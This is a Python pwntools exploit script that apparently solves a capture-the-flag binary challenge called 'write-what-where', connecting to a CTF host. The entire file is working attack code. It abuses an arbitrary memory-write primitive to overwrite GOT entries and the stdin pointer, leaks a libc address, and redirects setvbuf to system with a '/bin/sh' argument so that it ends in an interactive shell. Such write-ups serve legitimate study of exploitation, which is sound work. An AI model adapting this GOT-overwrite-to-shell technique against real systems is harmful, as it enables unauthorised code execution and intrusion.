#!/usr/bin/python3
from pwn import *

def start(argv=[], *a, **kw):
	if args.GDB:  # GDB NOASLR
		context.terminal = ["/mnt/c/wsl_terminal/wsl-terminal/open-wsl.exe", "-e"]
		return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
	elif args.REMOTE:
		return remote('pwn-2021.duc.tf', 31920, *a, **kw)
	else:  # Run locally
		return process(['./ld-2.33.so', '--preload', './libc.so.6', exe] + argv, *a, **kw)

gdbscript = '''
init-pwndbg
b *main
b *main+33
b *main+122
b *main+150
continue
'''.format(**locals())

exe = './write-what-where'
elf = context.binary = ELF(exe, checksec=False)
libc = ELF('./libc.so.6')
# warning/info/debug
context.log_level = 'debug'

io = start()

def www(what, where):
	# read 4 bytes -> p32
  io.sendafter(b'what?\n', what)
	# read 9 bytes -> p64 + '\n'
  io.sendlineafter(b'where?\n', bytes(where, 'utf-8'))

# overwrite exit with main+33 to get infinite writes
# while avoiding the call to init()
www(p32(elf.symbols['main']+33), str(elf.got['exit']))

# replace stdin with puts got
www(p32(elf.got['puts']), str(elf.symbols['stdin']))
www(p32(0), str(elf.symbols['stdin']+4))

# overwrite setvbuf with puts to get libc leak
www(p32(elf.plt['puts']), str(elf.got['setvbuf']))
www(p32(0), str(elf.got['setvbuf'] + 4))

# overwrite exit with main to trigger the call to init()
www(p32(elf.symbols['main']), str(elf.got['exit']))

# parse leak
libc_leak = u64(io.recvline()[:-1].ljust(8, b'\x00'))
libc_base = libc_leak - 0x809d0
log.success('libc base: ' + hex(libc_base))

bin_sh = libc_base + 0x1abf05
system = libc_base + libc.symbols['system']

# overwrite exit with main+33 again to avoid init()
www(p32(elf.symbols['main']+33), str(elf.got['exit']))

# replace stdin with pointer to /bin/sh string
www(p64(bin_sh)[:4], str(elf.symbols['stdin']))
www(p64(bin_sh)[4:], str(elf.symbols['stdin']+4))

# overwrite setvbuf with system for the win
www(p64(system)[:4], str(elf.got['setvbuf']))
www(p64(system)[4:], str(elf.got['setvbuf']+4))

# overwrite exit with main to trigger the call to init()
www(p32(elf.symbols['main']), str(elf.got['exit']))

io.interactive()
